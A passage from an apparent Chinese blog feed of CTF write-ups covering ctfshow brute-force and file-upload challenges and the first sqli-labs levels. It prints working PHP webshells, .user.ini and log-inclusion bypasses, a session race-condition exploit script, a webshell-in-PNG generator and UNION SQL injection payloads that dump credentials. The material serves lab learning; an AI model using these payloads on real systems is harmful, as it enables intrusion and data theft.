Processing处设置前缀为621022，后缀为5237<br>然后开始爆破，成功拿到身份证号，在响应中发现Unicode编码的字符:<br><code>\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801</code><br>解码后得到如下信息：<br><code>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</code><br>那么直接输入学号密码，即可拿到flag。</p><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p>暴力破解目录，我们可以看到URL为如下所示：<br><code>http://f1cc8a3d-95f3-44fb-8faf-11ed2f3aa85c.challenge.ctf.show/0/1/2.txt</code><br>其中0，1我们直接暴力破解，在这两个位置爆破数字1到100，像下面那样：<br><code>GET /§0§/§1§/index.php HTTP/1.1</code><br>然后将Positions处的Attack type改为Cluster bomb，便于我们爆破多个。</p><ul><li>Payloads<br>该页面下的Payload Sets 的Payload type修改为Numbers<br>并在Payload Options处From:1  To:100  Step: 1<br>两个爆破的位置都要设置，总计爆破10000次，调整线程，可以加快速度。</li></ul><p>最后成功拿到flag</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>爆破篇到这里就结束了，总的来说内容不多，难度不大。爆破类型还是较少，不过也并非毫无收获。希望能够有更加丰富的爆破训练。<br>这里再补充一点关于<a href="https://blog.csdn.net/weixin_39190897/article/details/86539542">验证码爆破与绕过的小知识</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;对于爆破，我的能力还非常不足，虽说是最后手段，但尽量不要有短板比较好。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="爆破" scheme="http://example.com/categories/CTF/%E7%88%86%E7%A0%B4/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="爆破" scheme="http://example.com/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-文件上传</title>
    <link href="http://example.com/2023/01/11/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2023/01/11/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-01-10T16:00:00.000Z</published>
    <updated>2023-01-12T09:00:15.343Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没啥好说的。</p><span id="more"></span><h1 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h1><ol><li>分析<br>通过尝试可知，这是在前端验证，于是我们尝试禁用js，但是会导致无法上传文件，于是放弃该方案。<br>然后通过尝试上传文件发现，只能上传后缀为png格式的文件，我们可以将一句话木马改为png格式上传，再用burp抓包后改为php后缀，最后使用蚁剑连接即可。</li><li>上传<br>和分析情况相同，直接上传成功，用蚁剑连接后，在上一级目录拿到flag。</li></ol><h1 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h1><p>考点是MIME Type，验证Content-Type是否为Image&#x2F;png<br>方式和前一题一样</p><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><p>是关于.user.ini的应用，实际上就是一个用户可以修改的配置文件，之前的一道CTF题里提及过该<a href="https://truthnian.github.io/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/">知识点</a>。</p><ol><li>上传<br>首先写好一个一句话木马，修改为c.png文件，直接上传<br>然后写好一个.user.ini文件，内容为：<br><code>auto_prepend_file=c.png</code><br>然后把该文件后缀改为png，抓包后再修改回ini<br>上传成功后，蚁剑连接：<br><code>http://46665bc5-3785-4b06-8c0a-4c3520c474bf.challenge.ctf.show/upload/</code><br>即可拿到flag</li></ol><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>本题检测了文件中的php字符串，一句话木马可以改为简写方式：<br><code>&lt;?=eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code><br>或者大小写绕过</p><p>和上一题方法一样<br>成功拿到flag</p><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><p>过滤了php，只能使用简写方式。</p><p>和上一题方法一样<br>成功拿到flag</p><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>多次尝试发现是过滤了[]<br>于是我们将一句话木马改为：<br><code>&lt;?=eval($_REQUEST&#123;&#39;cmd&#39;&#125;);?&gt;</code><br>仍然需要上传.user.ini文件<br>成功拿到flag</p><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>被过滤了的有 <code>php, [], ;</code><br>因此无法使用一句话木马，我们改为执行代码，使用system函数显示出所需的flag文件<br>仍然需要上传.user.ini文件<br>成功拿到flag</p><p>将文件内容修改为：<br><code>&lt;?=system(&#39;cat ../f*&#39;)?&gt;</code><br>然后上传，<br>仍然需要上传.user.ini文件<br>完毕后访问页面: <code>url/upload/index.php</code><br>查看源代码，最终拿到flag</p><h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p>仍然需要上传.user.ini文件<br>和上一题几乎一致，访问页面: <code>url/upload</code><br>查看源代码，最终拿到flag</p><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><p>由于过滤了 <code>()</code><br>所以我们使用反引号(`)，由此代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`cat ../f*`?&gt;</span><br></pre></td></tr></table></figure><h1 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h1><p>Linux下：<br>nginx的默认日志地址为: <code>/var/log/nginx/access.log</code><br>apache的默认日志地址为: <code>/var/log/apache2/access.log</code></p><p>在这道题中，反引号和空格均被过滤，那么我们采用日志文件包含。<br>原理是将一句话木马写入ua中，然后ua的内容会传到日志文件，由于我们将日志文件包含了，那么就能显示一句话木马，也即可以连接蚁剑。<br>首先，日志文件默认格式为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log_format access &#x27;$remote_addr – $remote_user [$time_local] &quot;$request&quot;&#x27; &#x27;$status $body_bytes_sent &quot;$http_referer&quot;&#x27; &#x27;&quot;$http_user_agent&quot; $http_x_forwarded_for&#x27;;</span><br></pre></td></tr></table></figure><p>于是我们可以写入文件内容如下:<br><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>同时抓包，修改ua为一句话木马。<br>最后通过蚁剑连接：<br><code>http://6514c240-517e-4eca-b889-2f61dacb8762.challenge.ctf.show/upload/</code><br>即可拿到flag</p><h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><p>这道题利用 <code>getimagesize()</code> 函数验证文件头，那么我们可以使用 <code>GIF89a</code> 绕过检测。<br>只需在上一题的基础上，在每个文件加上GIF89a即可。</p><h1 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h1><ol><li><p>分析<br>这一次过滤了 <code>. flag</code>因此无法再使用原来的方式绕过，那么我们可以使用SESSION文件包含+条件竞争方式获取flag<br>这里有两篇文章可以详细解释SESSION文件包含的原理：<br><a href="https://www.php.net/manual/zh/session.upload-progress.php">Session 上传进度</a><br><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含</a><br>简单说一下原理：<br>在php.ini有以下几个默认选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">//表示upload_progress的功能开始，当浏览器向服务器上传一个文件时，</span><br><span class="line">//php将会把这次文件上传的详细信息（如上传时间，进度等）存储在session中，可以发送一个POST请求终端来检查这个状态</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">//表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">//name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">//prefix+name将表示为session中的键名</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br><span class="line">7. session.use_strict_mode=0</span><br><span class="line">//此时用户可以自定义Session ID.</span><br><span class="line">//比如：在Cookie里设置PHPSESSID=123,PHP将在服务器上创建一个文件: /tmp/sess_123</span><br><span class="line">//即使此时用户没有初始化Session，也会自动初始化Session,并产生一个prefix+name连接在一起的值。</span><br></pre></td></tr></table></figure><p>也就是说，Session文件里有flag，当用POST方式带有命令执行的数据访问页面时，Session文件里会包含有flag数据，因此我们可以尝试获取Session文件的数据来获取flag，但由于Session文件的数据很快会被php.ini中的 <code>session.upload_progress.cleanup = on</code> 清空，因此我们需要采取条件竞争的方式获取flag。</p></li><li><p>上传<br>首先上传.user.ini,内容是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=&quot;png&quot;</span><br></pre></td></tr></table></figure><p>然后上传png，内容是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/tmp/sess_123&quot;?&gt;</span><br></pre></td></tr></table></figure><p>最后使用python写一个条件竞争的脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">url1 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码利用PHP Web应用程序中的竞争条件读取包含flag的文件。<br>设置了‘PHPSESSID’的cookies为’sess’的值为’123’<br>创建了两个线程: 一个重复发送POST请求到url1变量指定的URL，带有一个 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，设置为包含PHP命令注入有效负载 <code>（&lt;?php system(&quot;tac ../f*&quot;);?&gt;）</code> 的字符串，另一个则重复发送GET请求到url2变量指定的URL，检查响应文本的”flag”字符串。</p></li></ol><h1 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h1><p>与上一题相同</p><h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>图片上传后会对其重命名，并且需要上传真实的png图片。<br>一般的一句话木马图片上传后会对其二次渲染，导致图片内的木马消失。</p><p>图片二次渲染是指对已经存在的图片进行修改或重新绘制的过程。这可以包括调整图像的颜色，添加新元素，或者删除现有元素等。<br>二次渲染可以用来改变图片的外观，或者用来添加水印，或者用来删除不需要的元素。它也可以用来调整图像的尺寸，或者对图像进行格式转换等。<br>图像二次渲染可以使用许多不同的工具来实现，包括专业的图像编辑软件，如 Photoshop 或 GIMP，也可以使用编程语言和图像处理库，如 PHP GD 库。<br>在图像处理过程中，二次渲染可以使用许多不同的技术，如图像分析、图像滤镜、图像插值和图像变换等。</p><p>因此我们需要通过PHP GD库来创建一张含有木马的图片能绕过服务器的二次渲染。PHP代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;D:/temp/b2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 图片内木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码使用了 PHP GD 库来创建一张新图片，尺寸为32x32像素。然后它使用一个十六进制数组来循环，并使用红色、绿色和蓝色值来设置图像中的像素。最后将图像保存为”b2.png”，保存在temp目录中。<br>将该图片上传后，访问该图片地址，并且传入以下参数：<br>GET:<br><code>http://eef25c0f-86f4-4cc9-9269-c17440f534c2.challenge.ctf.show/download.php?image=88c1ceb8ad1b0be7870b26ce8f79acc7.png&amp;0=system</code><br>POST:<br><code>1=cat f*</code></p><p>这样便能拿到flag</p><h1 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h1><p>jpg的二次渲染，但我没成功，暂时搁置吧</p><h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>仍然失败，看来需要暂时做点别的换换心情了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;没啥好说的。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件上传" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs 1-65</title>
    <link href="http://example.com/2023/01/11/sqli-labs%201-65/"/>
    <id>http://example.com/2023/01/11/sqli-labs%201-65/</id>
    <published>2023-01-10T16:00:00.000Z</published>
    <updated>2023-01-11T09:40:31.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次为sqli-labs的合集，为了方便。</p><span id="more"></span><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="1-2-GET方式的数字型和字符型的联合注入"><a href="#1-2-GET方式的数字型和字符型的联合注入" class="headerlink" title="1-2(GET方式的数字型和字符型的联合注入)"></a>1-2(GET方式的数字型和字符型的联合注入)</h2><ol><li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong></li></ol><ul><li>有提示。则存在SQL注入</li><li>无提示。不存在SQL注入<br>（说明：有提示即代表输入的数据带入到了数据库中查询，因此存在注入）<br>只有存在SQL注入才能继续往下执行。<br><img src="/simg/sqli-labs_1.png" alt="sqli-labs_1"></li></ul><ol start="2"><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>方法是：<br>首先输入：<br> ?id&#x3D;1 and 1&#x3D;2  或  ?id&#x3D;1’–+<br>由于之前我们已经输入过 ?id&#x3D;1’ 出现报错，<br>如果本次输入再次出现报错，说明是 数字型<br>否则即为 字符型</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong><br>为什么要猜解字段数？<br>因为我们已知存在SQL注入且其类型，可以使用联合查询注入。要使用联合注入首先得知道字段数。<br>（说明：联合查询Union:是把2个sql语句一起查询结果合并，且两张表需要有相同的列数和字段名，使用方式示例如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B</span><br></pre></td></tr></table></figure><p>）<br>字段数可以通过order by语句得知。原理是通过order by语句查询，显示正常时是查询列数小于等于总列数。如果报错则该查询列数超过总列数。由此可得知字段数。示例语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆出显示位</strong><br>所谓爆出显示位，意思是查看分析哪些列是在页面显示的，这有利于我们后续的分析操作。<br>因此我们可以通过如下语句查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>（说明：id&#x3D;-1的原因是为了让查询结果完全是union右边的值）</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>获取数据库名可以执行一些后续操作，获取版本号可以判断哪些数据库操作能做哪些不能做。<br><a href="https://blog.csdn.net/weixin_34678198/article/details/113273999">MYSQL版本简单区别</a><br>因此我们可以通过如下语句查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure><p>这里用到了mysql的系统函数，下面列举5个常用mysql注入系统函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()     MySQL版本</span><br><span class="line">user()       数据库用户名</span><br><span class="line">database()   数据库名</span><br><span class="line">@@datadir    数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong><br>首先需要介绍数据库默认库information_schema（5.0以上版本有该库）中的重要表</p></li></ol><ul><li><p>information_schema.schemata<br>schemata表中重要字段为schema_name，此字段涵盖数据库存在的所有库名字，我们可以通过查询语句得知我们想要的数据库都有哪些（database()只可得知当前数据库）<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema,schemata</span><br></pre></td></tr></table></figure><p>（说明：group_concat()的作用是将所有结果连接显示成一行）</p></li><li><p>information_schema.tables<br>tables表中重要字段为table_schema（库名）和table_name（表名）。可通过查询语句得到库名或表名，但由于table_schema与表字段table_name一一对应，有大量重复内容。只爆库建议使用schemata库查询<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_schema),group_concat(table_name) from information_schema.tables--+</span><br></pre></td></tr></table></figure><p>通过此方法可单独爆出某个数据库内的表名，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x646F75706870--+</span><br></pre></td></tr></table></figure><p>说明：通过匹配库爆表，需要将库名转换成哈希值或二进制，否则有时候会被转义从而报错</p></li><li><p>information_schema.columns<br>columns表中存在三个重要字段，分别为table_schema（库名字段）、table_name（表名字段）、column_name（字段）<br>可以直接利用这个表对数据库进行爆库爆表操作，只是仍然有很多重复字段，并不建议这么做。</p></li></ul><p>在本关中具体语句即为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><ol start="7"><li><p><strong>爆字段名</strong><br>通过sql语句查询知道当前数据库有4个表，根据表名知道可能用户的账号和密码是在users表中。因此接下来即为得到该表的字段名和内容。<br>示例语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p>说明：该语句查询information_schema数据库下的columns表的table_name字段。注意table_name字段在tables表和columns表中均存在。表示所有字段对应的表名。</p></li><li><p><strong>爆数据</strong><br>通过上述操作可知敏感字段username和password，接下来即查询该字段对应的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-GET方式的字符型的联合注入"><a href="#3-GET方式的字符型的联合注入" class="headerlink" title="3(GET方式的字符型的联合注入)"></a>3(GET方式的字符型的联合注入)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li></ol><p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p><ol start="3"><li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li><li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li><li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li><li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h2 id="4-GET方式的字符型的联合注入"><a href="#4-GET方式的字符型的联合注入" class="headerlink" 